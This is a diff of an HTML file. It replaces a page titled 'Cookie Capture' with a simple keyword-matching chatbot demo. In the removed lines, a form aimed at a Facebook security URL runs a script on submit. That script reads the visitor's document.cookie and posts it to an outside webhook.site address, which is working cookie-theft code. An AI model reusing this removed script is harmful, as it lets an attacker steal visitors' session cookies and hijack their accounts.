@@ -1,27 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Cookie Capture</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Chatbot</title>
 </head>
 <body>
-    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1" onsubmit="captureCookies()">
-        <input type="hidden" name="hide_back_button" value="1">
-        <input type="hidden" name="from_accounts_center" value="1">
-        <input type="submit" value="Send">
-    </form>
+    <h1>Welcome to the AI Chatbot</h1>
+    <div id="chat-container"></div>
+    <input type="text" id="user-input" placeholder="Type your message...">
+    <button onclick="sendMessage()">Send</button>
 
     <script>
-        function captureCookies() {
-            // Capture cookies
-            var cookies = document.cookie;
-            
-            // Send cookies to webhook
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://webhook.site/513fcb7b-f6e1-408b-8d6d-3da8626bdfb2", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify({ cookies: cookies }));
+        function sendMessage() {
+            var userInput = document.getElementById("user-input").value;
+            appendMessage("User: " + userInput);
 
-            return true; // Proceed with form submission
+            // Call AI service (simple JavaScript-based AI)
+            var aiResponse = getAIResponse(userInput);
+            appendMessage("AI: " + aiResponse);
+
+            // Clear input field
+            document.getElementById("user-input").value = "";
+        }
+
+        function appendMessage(message) {
+            var chatContainer = document.getElementById("chat-container");
+            var messageElement = document.createElement("div");
+            messageElement.textContent = message;
+            chatContainer.appendChild(messageElement);
+        }
+
+        function getAIResponse(input) {
+            // Simple JavaScript-based AI
+            if (input.toLowerCase().includes("hello")) {
+                return "Hello! How can I assist you?";
+            } else if (input.toLowerCase().includes("how are you")) {
+                return "I'm just a computer program, but thanks for asking!";
+            } else {
+                return "I'm sorry, I don't understand.";
+            }
         }
     </script>
 </body>
